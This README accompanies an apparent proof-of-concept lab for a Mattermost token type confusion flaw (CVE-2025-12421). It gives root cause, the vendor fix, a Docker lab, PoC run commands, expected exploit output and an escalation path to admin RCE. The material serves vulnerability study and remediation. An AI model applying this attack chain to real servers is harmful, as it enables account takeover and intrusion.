# CVE-2025-12421 - Mattermost Token Type Confusion to Account Takeover

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-12421 |
| Component | [Mattermost Server](https://github.com/mattermost/mattermost) |
| Type | CWE-303: Incorrect Implementation of Authentication Algorithm |
| CVSS | 9.9 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| EPSS | 0.1% (26.6th percentile) |
| Affected | 11.0.x <= 11.0.2, 10.12.x <= 10.12.1, 10.11.x <= 10.11.4, 10.5.x <= 10.5.12 |
| Fix | Upgrade to v11.0.3, v10.12.2, v10.11.5, or v10.5.13+ |
| Author | Exploit Intelligence Platform |
| Date | 2025-11-27 |

## Vulnerability Details

CVE-2025-12421 is a critical authentication bypass in Mattermost Server's mobile SSO code exchange flow. The `ConsumeTokenOnce()` function consumes tokens from the `Tokens` database table without verifying the token type, allowing an attacker to exchange any token type (`saml`, `oauth`, `password_recovery`, `verify_email`, or even fabricated types) for a valid authenticated session as any user — resulting in full account takeover.

### Root Cause

The `SqlTokenStore.ConsumeOnce()` function in `server/channels/store/sqlstore/tokens_store.go` executes:

```sql
DELETE FROM Tokens WHERE Token = ? RETURNING *
```

This query matches tokens solely by their token string value and does not filter by the `Type` column. The calling function `App.ConsumeTokenOnce()` in `server/channels/app/user.go` passes through without adding any type validation.

The vulnerable endpoint `POST /api/v4/users/login/sso/code-exchange` is unauthenticated (`RequireSession: false`), meaning the final exploitation step requires no prior session — only knowledge of a valid token value and matching PKCE values that the attacker controls.

### Attack Chain

```
1. Discover victim's user_id via Mattermost API
2. Generate PKCE values: code_verifier → SHA256 → base64url = code_challenge
3. Insert crafted token into Tokens table (any type works — e.g., "saml")
   with victim's user_id and attacker-controlled PKCE challenge in Extra JSON
4. POST /api/v4/users/login/sso/code-exchange with token + matching code_verifier
5. Server consumes token without type check → returns valid session for victim
6. GET /api/v4/users/me with stolen session → full account takeover
```

### Escalation Path

If the attacker targets a System Admin account:

1. **Account takeover** → full administrative control
2. **Plugin upload**: Admin can upload arbitrary server-side Go plugins → **RCE**
3. **System console access**: Modify database credentials, SMTP, file storage
4. **Data exfiltration**: Export all data via compliance exports

### Fix

The upstream fix (commit [`acda1fb5`](https://github.com/mattermost/mattermost/commit/acda1fb5dd46a2f46c76ae67012423c760525eaa)) adds type enforcement at the SQL level:

```diff
- DELETE FROM Tokens WHERE Token = ? RETURNING *
+ DELETE FROM Tokens WHERE Type = ? AND Token = ? RETURNING *
```

A new token type `TokenTypeSSOCodeExchange = "sso-code-exchange"` was added. Both `ConsumeOnce()` and `ConsumeTokenOnce()` now require a `tokenType` parameter — callers cannot accidentally omit the type check.

## Affected Versions

| Branch | Vulnerable Range | Patched Version |
|--------|------------------|-----------------|
| 11.0.x | 11.0.0 – 11.0.2 | **11.0.3** |
| 10.12.x | 10.12.0 – 10.12.1 | **10.12.2** |
| 10.11.x | 10.11.0 – 10.11.4 | **10.11.5** |
| 10.5.x | 10.5.0 – 10.5.12 | **10.5.13** |

## Lab Setup

### Architecture

```
┌─────────────────────────────────────────────┐
│  cve-2025-12421-vulnerable                  │
│  (postgres:14 base image)                   │
│                                             │
│  ┌─────────────────┐  ┌──────────────────┐  │
│  │  PostgreSQL 14   │  │  Mattermost      │  │
│  │  Port: 5432      │  │  v11.0.2         │  │
│  │  User: mmuser    │  │  Port: 8065      │  │
│  │  Pass: mostest   │  │  Team Edition    │  │
│  │  DB: mattermost  │  │                  │  │
│  │      _test       │  │                  │  │
│  └─────────────────┘  └──────────────────┘  │
└─────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-12421

# Build and start
docker compose build
docker compose up -d

# Wait for health check (~30-60 seconds)
docker compose ps

# Create test users (first run only — first user becomes admin)
curl -s -X POST http://localhost:8065/api/v4/users -H 'Content-Type: application/json' \
  -d '{"email":"admin@example.com","username":"admin","password":"Admin12345"}'
TOKEN=$(curl -s -D- http://localhost:8065/api/v4/users/login -H 'Content-Type: application/json' \
  -d '{"login_id":"admin@example.com","password":"Admin12345"}' 2>/dev/null | grep -i ^token: | awk '{print $2}' | tr -d '\r')
curl -s -X POST http://localhost:8065/api/v4/users -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" -d '{"email":"victim@example.com","username":"victim","password":"Victim12345"}'

# Run the exploit (connects to Mattermost:8065 + PostgreSQL:5432)
python3 poc/poc.py localhost

# Run the multi-type token test
python3 poc/poc_vector2_multitype.py localhost

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-12421-vulnerable` | Mattermost v11.0.2 + PostgreSQL 14 | `postgres:14` | `8065` | All-in-one vulnerable target (preview-style) |

### Default Credentials

| Service | Username | Password | Role |
|---|---|---|---|
| Mattermost | `admin` | `Admin12345` | System Admin |
| Mattermost | `victim` | `Victim12345` | User |
| PostgreSQL | `mmuser` | `mostest` | DB Owner |

### Environment Variables

| Variable | Value | Purpose |
|----------|-------|---------|
| `MM_FEATUREFLAGS_MOBILESSOCODEEXCHANGE` | `true` | Enables the vulnerable `/users/login/sso/code-exchange` endpoint |
| `MM_EMAILSETTINGS_REQUIREEMAILVERIFICATION` | `false` | Disables email verification |
| `MM_TEAMSETTINGS_ENABLEOPENSERVER` | `true` | Allows user self-registration |
| `MM_EXPERIMENTALSETTINGS_ENABLEAUTHENTICATIONTRANSFER` | `true` | Enables auth method switching |

## PoC Usage

Two PoC scripts are provided, both using Python 3 standard library only (**no external dependencies**).

### PoC 1: SAML Token Type Confusion (`poc/poc.py`)

Demonstrates full account takeover by inserting a crafted `saml`-typed token into the database via the PostgreSQL wire protocol (port 5432) and exchanging it at the SSO code-exchange endpoint.

```bash
# Run against the lab (connects to Mattermost on 8065 and PostgreSQL on 5432)
python3 poc/poc.py localhost

# Specify custom ports
python3 poc/poc.py <host> [mm_port] [pg_port]
python3 poc/poc.py localhost 8065 5432
```

### Expected Output (Vulnerable)

```
======================================================================
CVE-2025-12421: Mattermost Token Type Confusion → Account Takeover
======================================================================

[*] Target: http://localhost:8065
[*] Token type used: 'saml' (should be 'sso-code-exchange')

[Step 1] Checking Mattermost version...
[+] Mattermost version: 11.0.2

[Step 2] Authenticating as attacker (admin user)...
[+] Logged in as: admin

[Step 3] Looking up victim user 'victim'...
[+] Victim: victim (id=bg85a5j73injjezoaah3mh8i8a)

[Step 4] Generating PKCE challenge and crafting malicious token...
[+] Token type: 'saml' (BUG: should require 'sso-code-exchange')

[Step 5] Inserting crafted token into the Tokens table...
[+] Token inserted successfully

[Step 6] Exploiting /api/v4/users/login/sso/code-exchange...
[!!!] EXPLOIT SUCCEEDED — HTTP 200 from code-exchange!
[+] Stolen session token: 3imx5iywz3bg3nix1d1a5bifze

[Step 7] Verifying account takeover with stolen session token...
[+] GET /api/v4/users/me returned:
    Username: victim
    Email:    victim@example.com

======================================================================
RESULT: VULNERABLE — CVE-2025-12421 CONFIRMED
======================================================================
```

### PoC 2: Multi-Type Token Confusion (`poc/poc_vector2_multitype.py`)

Tests that all token types are accepted — proving zero type validation in `ConsumeTokenOnce()`. Connects to PostgreSQL directly via wire protocol (port 5432).

```bash
python3 poc/poc_vector2_multitype.py localhost
python3 poc/poc_vector2_multitype.py localhost 8065 5432
```

```
Token Type                Result          Details
----------------------------------------------------------------------
  saml                    ACCEPTED        session=edybychf...
  oauth                   ACCEPTED        session=h9hhaeutm...
  password_recovery       ACCEPTED        session=hyd98w65a...
  verify_email            ACCEPTED        session=tj966988b...
  team_invitation         ACCEPTED        session=hyxbyjg6y...
  guest_invitation        ACCEPTED        session=7dsar4adm...
  totally_fake_type       ACCEPTED        session=c8xxcysnc...

RESULTS: 7/7 token types accepted
```

## Verification: Vulnerable vs Patched

| Behavior | Vulnerable (v11.0.2) | Patched (v11.0.3+) |
|----------|---------------------|---------------------|
| `saml` token at code-exchange | Accepted — session returned | Rejected — token not found |
| `oauth` token at code-exchange | Accepted — session returned | Rejected — token not found |
| `password_recovery` token | Accepted — session returned | Rejected — token not found |
| `totally_fake_type` token | Accepted — session returned | Rejected — token not found |
| `sso-code-exchange` token | Accepted (type didn't exist yet) | Accepted — correct type |
| SQL query in `ConsumeOnce()` | `DELETE ... WHERE Token = ?` | `DELETE ... WHERE Type = ? AND Token = ?` |
| Account takeover possible | **Yes** | **No** |

## Key Vulnerable Files

| File | Function | Role |
|------|----------|------|
| `server/channels/store/sqlstore/tokens_store.go` | `ConsumeOnce()` | SQL query without type filter — core vulnerability |
| `server/channels/app/user.go` | `ConsumeTokenOnce()` | App-layer wrapper — no type parameter |
| `server/channels/api4/user.go` | `loginSSOCodeExchange()` | Endpoint handler — calls `ConsumeTokenOnce()` without specifying expected type |
| `server/channels/web/saml.go` | `completeSaml()` | Creates mobile SSO tokens with wrong type (`saml` instead of `sso-code-exchange`) |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — SAML token type confusion to account takeover |
| `poc/poc_vector2_multitype.py` | Tests all 7 token types (proves zero type validation) |
| `Dockerfile.vulnerable` | Builds Mattermost v11.0.2 + PostgreSQL 14 all-in-one container |
| `docker-compose.yml` | Lab orchestration |
| `config_docker.json` | Mattermost configuration (relaxed security for PoC) |
| `docker-entry.sh` | Container entrypoint (starts PostgreSQL then Mattermost) |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause trace and fix assessment |
| `lab_build_report.md` | Lab construction documentation |
| `poc_verification_report.md` | PoC test results |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-12421)
- [GHSA-mp6x-97xj-9x62](https://github.com/advisories/GHSA-mp6x-97xj-9x62)
- [Vendor Advisory](https://mattermost.com/security-updates)
- [Source Repository](https://github.com/mattermost/mattermost)
- [Original Fix Commit](https://github.com/mattermost/mattermost/commit/acda1fb5dd46a2f46c76ae67012423c760525eaa)

### Fix Commits

| Branch | Commit |
|--------|--------|
| main | [`acda1fb5`](https://github.com/mattermost/mattermost/commit/acda1fb5dd46a2f46c76ae67012423c760525eaa) |
| release-11.0 | [`feb598ed`](https://github.com/mattermost/mattermost/commit/feb598ed2b7ac3cb78a253b032ad7e4628b0de00) |
| release-10.11 | [`f361e7d7`](https://github.com/mattermost/mattermost/commit/f361e7d75a7ab9df5a2106e1ceb919b94b55e41d) |
| release-10.5 | [`5072bbf6`](https://github.com/mattermost/mattermost/commit/5072bbf689a46b3b97b2373f26149f5891396e6b) |

## Timeline

| Date | Event |
|------|-------|
| 2025-11-27 | CVE-2025-12421 published |
| 2025-11-27 | GHSA-mp6x-97xj-9x62 advisory released |
| 2025-11-27 | Patched versions released: v11.0.3, v10.12.2, v10.11.5, v10.5.13 |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-12421 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
